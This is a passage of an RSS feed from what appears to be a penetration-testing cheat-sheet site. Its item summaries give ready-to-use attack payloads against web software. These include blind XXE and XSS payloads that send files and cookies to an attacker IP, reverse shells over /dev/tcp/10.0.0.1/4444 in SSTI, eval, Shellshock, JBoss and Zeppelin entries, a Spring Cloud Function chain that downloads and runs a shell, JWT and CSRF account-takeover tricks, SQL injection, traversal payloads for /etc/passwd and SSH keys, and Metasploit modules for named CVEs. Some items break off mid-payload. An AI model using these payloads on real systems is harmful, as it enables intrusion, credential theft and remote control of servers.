      <description>Abuse Connection State linkIf the web server validates only the first request, we may be able to exploit the second request by keeping the connection and changing the Host header to the internal page.&#xA;1. Send the First Request link GET / HTTP/2 Host: example.com ... Connection: keep-alive 2. Send the Second Request. link POST /admin/change-email HTTP/2 Host: 192.168.0.1 email=admin@example.com&amp;amp;new_email_1=attacker@evil.com&amp;amp;new_email_2=attacker@evil.com As a result, we may be able to change the admin&amp;rsquo;s email to arbitrary email.</description>
    </item>
    <item>
      <title>JWT (Json Web Token) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</link>
      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</guid>
      <description>Decode JWT link There are some online JWT decoder/encoder tools like JWT.io. CyberChef can be used for JWT decode. Manipulate JWT linkIf the website uses JWT and we can see the token, copy the JWT and paste it in jwt.io.&#xA;Replace the &amp;ldquo;alg&amp;rdquo; value with &amp;ldquo;none&amp;rdquo; in header. (try the alg header variations such as &amp;ldquo;none&amp;rdquo;, &amp;ldquo;None&amp;rdquo;, &amp;ldquo;nOnE&amp;rdquo;, &amp;ldquo;NONE&amp;rdquo;.) Replace arbitrary values of the payload e.g. &amp;ldquo;username&amp;rdquo; with &amp;ldquo;admin&amp;rdquo;. Empty the signature field.</description>
    </item>
    <item>
      <title>Blind XXE</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</link>
      <pubDate>Sat, 10 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</guid>
      <description>Data Exfiltration via Out-Of-Band link1. Create a Malicious DTD linkWe need to prepare the dtd file (named &amp;ldquo;exploit.dtd&amp;rdquo; here) to retrieve the target file.&#xA;Replace the ip address with your own.&#xA;&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!-- &amp;lt;!ENTITY % file SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; --&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &amp;#39;http://10.0.0.1/?x=%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfiltrate; Then host it on web server.&#xA;sudo python3 -m http.server 80 2. Insert XXE linkIn http request body, insert the following XXE payload.</description>
    </item>
    <item>
      <title>CSRF (Cross-Site Request Forgery)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</link>
      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</guid>
      <description>Account Takeover linkIf the victim user access to the page where the payload put in, the victim account information will be changed to the attacker&amp;rsquo;s information e.g. Email address or Username.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.forms[0].submit(); &amp;lt;/script&amp;gt; CSRF Token Bypass linkBelow is to bypass CSRF token by using another CSRF token that we get.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.</description>
    </item>
    <item>
      <title>Tornado Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</link>
      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) linkWe can execute arbitrary Python script using the server-site template injection.&#xA;First check if the script will be executed as below.&#xA;&amp;lt;title&amp;gt;Website by {{ 2*3 }}&amp;lt;/title&amp;gt; &amp;lt;span&amp;gt;{{ 2*3 }}&amp;lt;/span&amp;gt; # URL parameters https://example.com/?q={{2*3}} If the website shows 6 instead of 2*3, we can execute arbitrary code.&#xA;Try following payloads.&#xA;{% import os %}{{ os.popen(&amp;#34;whoami&amp;#34;).read() }} # Reverse shell. Replace &amp;#34;10.0.0.1&amp;#34; with your own ip # It requires a listener like `nc -lvnp 4444` in local terminal.</description>
    </item>
    <item>
      <title>Receive Email as Another Address</title>
      <link>https://documentnation.github.io/docs/hdks/email/receive-email-as-another-address/</link>
      <pubDate>Sat, 20 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/email/receive-email-as-another-address/</guid>
      <description>Exploit DNS Zone Misconfiguration &amp;amp; BIND Config linkIf target host has the domain for email e.g. “mail.example.com” and we can get BIND secret key, we can update&#xA;1. Get BIND Secret Key linkWe need to get the BIND key in the config file.&#xA;# /etc/bind/named.conf key &amp;#34;rndc-key&amp;#34; { algorithm hmac-sha256; secret &amp;#34;zBatC828gunRa...bA=&amp;#34;; }; 2. Update DNS Zone linkAfter retrieving the BIND secret, update DNS zone to add the new record for receiving email, with subdomain and our ip address.</description>
    </item>
    <item>
      <title>Cacti Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</guid>
      <description>Default Credentials link admin:admin Common Directories link /include/config.php Remote Code Execution (RCE) CVE-2022-46169 linkReference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/&#xA;msfconsole msf&amp;gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection msf&amp;gt; (set options...) msf&amp;gt; run Also we can refer to Exploit DB.</description>
    </item>
    <item>
      <title>Gogs Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</guid>
      <description>SQL injection (CVE-2014-8682) link http://127.0.0.1:3000/api/v1/users/search?q=&amp;#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1-- Automation link sqlmap -u &amp;#34;https://example.com/api/v1/repos/search?q=test&amp;#34; sqlmap -u &amp;#34;https://example.com/api/v1/users/search?q=test&amp;#34; Git Hooks Remote Code Execution (RCE) link msfconsole msf&amp;gt; use exploit/multi/http/gogs_git_hooks_rce msf&amp;gt; (set options...) msf&amp;gt; run </description>
    </item>
    <item>
      <title>Microsoft Exchange Server Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</link>
      <pubDate>Sun, 23 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</guid>
      <description>Enumeration linkOWA (Outlook Web Access) link msfconsole # Client Access Server (CAS) IIS HTTP Internal IP Disclosure msf&amp;gt; use auxiliary/scanner/http/owa_iis_internal_ip # Brute Force credentials msf&amp;gt; use auxiliary/scanner/http/owa_login Common Directories link # Autodiscover service /autodiscover/ /autodiscover/autodiscover.xml # Enhanced Client or Proxy /ecp/ # Exchange Web Services /ews/ # Offline Address Books /oab/ # Outlook Web Access /owa/ /owa/auth/login.aspx ProxyShell RCE linkCVE-2021-31207, CVE-2021-34523, CVE-2021-34473 Reference: https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/&#xA;msfconsole msf&amp;gt; use exploit/windows/http/exchange_proxyshell_rce msf&amp;gt; (set options.</description>
    </item>
    <item>
      <title>Cookie Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</link>
      <pubDate>Fri, 21 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</guid>
      <description>Cookie Manipulation link Cookie: PHPSESSID=0 Cookie: PHPSESSID=1 Cookie: PHPSESSID=999 &amp;lt;!-- ASCII Hex --&amp;gt; Cookie: PHPSESSID=3836382d61646d696e PHP Cookie Grabbing with XSS linkIn your local machine, create the payload for grabbing the cookie when the other user will access your machine.&#xA;// steal_cookie.php &amp;lt;?php echo $_GET[&amp;#39;cookie&amp;#39;]; ?&amp;gt; Create the JavaScript code to force users to access your machine which shows the victim&amp;rsquo;s cookie value.&#xA;&amp;lt;script&amp;gt;document.location = &amp;#39;http://&amp;lt;attacker-ip&amp;gt;:4444/steal_cookie.php?cookie=&amp;#39;&amp;#43;document.cookie&amp;lt;/script&amp;gt; POST request with this JavaScript code to the target web page.</description>
    </item>
    <item>
      <title>Icinga Web Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</link>
      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.&#xA;Automation linkThis repository is available for reverse shell automatically.&#xA;In local machine, start a listener.&#xA;nc -lvnp 4444 Next create a PEM file and download the script, then execute it.&#xA;ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I &amp;lt;local-ip&amp;gt; -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.</description>
    </item>
    <item>
      <title>Session Fixation</title>
      <link>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</link>
      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</guid>
      <description>Exploitation link1. Attacker Logins Website to Get the Session linkAn attacker need to login to a legitimate website then get the session value.&#xA;Cookie: sessid=abcdef 2. Attacker Sends the Session Value to Victim linkThere are various way to send the attacker’s session value. For example,&#xA;Send email.&#xA;Predict a session value.&#xA;Eavesdrop a session using packet sniffer such as Wireshark.&#xA;XSS&#xA;&amp;lt;script&amp;gt;document.cookie = ATTACKERS_SESSION_ID&amp;lt;/script&amp;gt; 3. Victim Logins with Attacker’s Session linkIf the victim logins and attacker’s session is set to the Cookie, the attacker can control the victim’s account in the website.</description>
    </item>
    <item>
      <title>Python Eval Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
    </item>
    <item>
      <title>PHP Filters Chain</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</guid>
      <description>Exploitation linkPHP Filter Chain Generator is available so we can use it.&#xA;python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39; We only have to do is paste the above generated payload to /?page=&amp;lt;genrated_chain&amp;gt;.&#xA;Reverse Shell linkFirst create a shell script named &amp;ldquo;revshell&amp;rdquo; in local machine.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then create a chain using a generator.&#xA;Replace the ip address with your own.&#xA;# `&amp;lt;?= ?&amp;gt;` is a shorthand for `&amp;lt;?php echo ~ ?</description>
    </item>
    <item>
      <title>XXE (XML External Entity)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</guid>
      <description>Read Files link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E PHP Filter link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; Remote Code Execution link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://whoami&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E SSRF attack link &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://sub.vulnerable.com/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; Also we can use the Blind XXE for exfiltrating data.</description>
    </item>
    <item>
      <title>Virtual Hosts (VHOSTS) Enumeration</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</guid>
      <description>Enumeration link # Ffuf ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # follow redirect (-r) ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 -r # Sometimes, we have to specify the ip address not domain. ffuf -u http://10.0.0.1/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # Wfuzz wfuzz -u http://example.com -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt --hl 138 If we found vhosts, add them to the /etc/hosts in our machine.</description>
    </item>
    <item>
      <title>wkhtmltopdf SSRF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</guid>
      <description>Exploitation linkCreate a PHP payload to read local file.&#xA;&amp;lt;?php header(&amp;#39;location:file://&amp;#39;.$_REQUEST[&amp;#39;x&amp;#39;]); ?&amp;gt; Then start web server in local machine.&#xA;php -S 0.0.0.0:8000 Send request to where wkhtmltopdf is affected. For example,&#xA;/htmltopdf?item=&amp;lt;iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; Now we can see the system users list via a generated PDF.</description>
    </item>
    <item>
      <title>Apache Zeppelin Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</guid>
      <description>Authentication Config File link /shiro.ini Default Credentials link admin:admin admin:password1 user1:password2 user1:role1 user1:role2 user2:password3 user2:role3 user3:password4 user3:role2 RCE in Notebooks linkWe can execute remote OS command in notebooks. Access to the notebook and execute the following scripts.&#xA;%python import os # Configurations os.system(&amp;#39;cat conf/shiro.ini&amp;#39;) Reverse Shell linkBefore executing the following script, we need to start a listener such as nc -lvnp 4444 in local machine.&#xA;%python import os,pty,socket;s=socket.socket();s.connect((&amp;#34;10.0.0.1&amp;#34;, 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.</description>
    </item>
    <item>
      <title>XSS with Dynamic PDF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</guid>
      <description>Basic link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;test&amp;#39;)&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;test&amp;#39;)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt; Path Disclosure link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(JSON.stringify(window.location))&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;&amp;lt;iframe src=\&amp;#34;&amp;#39; &amp;#43; window.location.href &amp;#43; &amp;#39;\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt; LFI/RFI link &amp;lt;iframe src=&amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///var/www/html/index.php width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost:3000/index.html&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost/server-status&amp;#34; height=&amp;#34;1000&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;#34;&amp;gt; LFI/RFI (XHR request) link &amp;lt;script&amp;gt; x = new XMLHttpRequest(); x.onload = function() { document.write(this.responseText) }; x.open(&amp;#34;GET&amp;#34;, &amp;#34;file:///etc/passwd&amp;#34;); x.send(); &amp;lt;/script&amp;gt; Cookie Hijacking link &amp;lt;img src=x onerror=&amp;#34;location.href=&amp;#39;http://10.0.0.1/?cookie=&amp;#39;&amp;#43; document.cookie&amp;#34;&amp;gt; External Scripts link &amp;lt;script src=&amp;#34;http://attacker.</description>
    </item>
    <item>
      <title>LimeSurvey Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</guid>
      <description>Default Credentials link admin:password Remote Code Execution (RCE) version &amp;lt; 3.16 linkReference: https://www.exploit-db.com/exploits/46634</description>
    </item>
    <item>
      <title>PHP hash_hmac Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</guid>
      <description>Investigation linkIf the website uses hash_hmac function on PHP as below, we can bypass by injecting parameters.&#xA;&amp;lt;?php if (empty($_POST[&amp;#39;hmac&amp;#39;]) || empty($_POST[&amp;#39;host&amp;#39;]) { header(&amp;#39;HTTP/1.0 400 Bad Request&amp;#39;); exit; } if (isset($_POST[&amp;#39;nonce&amp;#39;]) $secret = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;nonce&amp;#39;], $secret); $hmac = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;host&amp;#39;], $secret); if ($hmac !== $_POST[&amp;#39;hmac&amp;#39;]) { header(&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;); exit; } ?&amp;gt; When executing the following command, the hash_hmac returns false.&#xA;php -r &amp;#34;echo hash_hmac(&amp;#39;sha256&amp;#39;, Array(), &amp;#39;secret&amp;#39;)==false;&amp;#34; # Output PHP Warning: hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1 1 Exploitation linkCreate a Hmac hash by running below.</description>
    </item>
    <item>
      <title>Java RMI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>JBOSS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</guid>
      <description>Enumeration link msfconsole msf &amp;gt; use auxiliary/scanner/http/jboss_vulnscan Common Directories link /admin-console/ /invoker/JMXInvokerServlet /jbossws/ /jmx-console/ /jmx-console/HtmlAdaptor /management /manager /status?full=true /web-console/ /web-console/Invoker /web-console/ServerInfo.jsp Default Credentials link admin:admin Exploitation linkJexBoss is available as an exploitation CLI tool.&#xA;git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip3 install -r requirements.txt python3 jexboss.py -host https://example.com:8080 # Reverse Shell Shell&amp;gt; /bin/bash -i &amp;gt; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1 </description>
    </item>
    <item>
      <title>CGI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</guid>
      <description>Enumeration CGI Scripts link ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt Shellshock linkShellshock is the vulnerability of bash v1.0.3-4.3 that allows users to execute arbitrary commands. If we found the CGI script under /cgi-bin/, modifying HTTP header to remote code execution.&#xA;GET /cgi-bin/example.cgi HTTP/1.1 User-Agent: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; Cookie: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; # Reverse Shell User-Agent: () { :; }; /bin/bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    <item>
      <title>JsRender Template Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</guid>
      <description>Investigation linkTry to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.&#xA;{{:2*3}} {{:&amp;#34;test&amp;#34;.toString}} Exploitation link # XSS {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;alert(1)&amp;#34;)}} # Read local files {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /etc/passwd&amp;#39;).toString()&amp;#34;)()}} </description>
    </item>
    <item>
      <title>Django Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</guid>
      <description>SSTI (Server-Side Template Injection) link # XSS {{ `&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;` }} # Debug information {% debug %} Bypass ALLOWED_HOSTS linkIf we get the error “Invalid HTTP_HOST header: &amp;lsquo;x.x.x.x:8000&amp;rsquo;. You may need to add &amp;lsquo;x.x.x.x&amp;rsquo; to ALLOWED_HOSTS&amp;quot; when accessing the website written in Django, you need to intercept the value of the Host in the HTTP request header.&#xA;Then you should be able to access the website.&#xA;Host: 0.0.0.0:8000 # or Host: 127.</description>
    </item>
    <item>
      <title>Spring Cloud Function RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</guid>
      <description>Exploitation linkReverse Shell linkFirst create a reverse shell script in local machine.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then start a web server for uploading it.&#xA;python3 -m http.server Now remote code execution with target website as below.&#xA;curl -X POST https://example.com:8080/functionRouter -H &amp;#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;#34;wget http://10.0.0.1/shell -O /tmp/shell&amp;#34;)&amp;#39; --data-raw &amp;#39;data&amp;#39; -v Our reverse shell script is uploaded.&#xA;Start a listener in local machine.&#xA;nc -lvnp 4444 Remote code execution again to reverse shell.</description>
    </item>
    <item>
      <title>Directory (Path) Traversal</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</guid>
      <description>/?file=index.php /?file=index.html /?file=/etc/passwd /?file=../../../etc/passwd /?file=../../../../etc/passwd /?file=../../../../../etc/passwd /?file=..//..//..//..//etc/passwd /?file=....//....//....//etc/passwd /?file=....//....//....//....//etc/passwd # URL encode /?file=..%252f..%252f..%252fetc/passwd /?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd # URL double encode /?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd /?file=/var/www/images/../../../etc/passwd /?file=/etc/passwd%00.png /?file=../../../etc/passwd%00.png /?file=....//....//....//etc/passwd%00.png /?file=..%252f..%252f..%252fetc/passwd%00.png /?file=/var/www/images/../../../etc/passwd%00.png # Hostfile /?file=/etc/hosts # SSH keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/authorized_keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/id_rsa # Web root in the developer&amp;#39;s home /?file=../../../../home/&amp;lt;username&amp;gt;/app/app.py # PHP web application /index.php/../ /index.php/..;/ /index.php/%2e%2e;/ # Windows /?file=..\..\..\windows\win.ini Apache 2.4.49 (CVE-2021-41773) link # without CGI enabled curl -v &amp;#39;https://example.com/cgi-bin/../../../../../../../../../../etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&amp;#39; # with CGI enabled curl -v 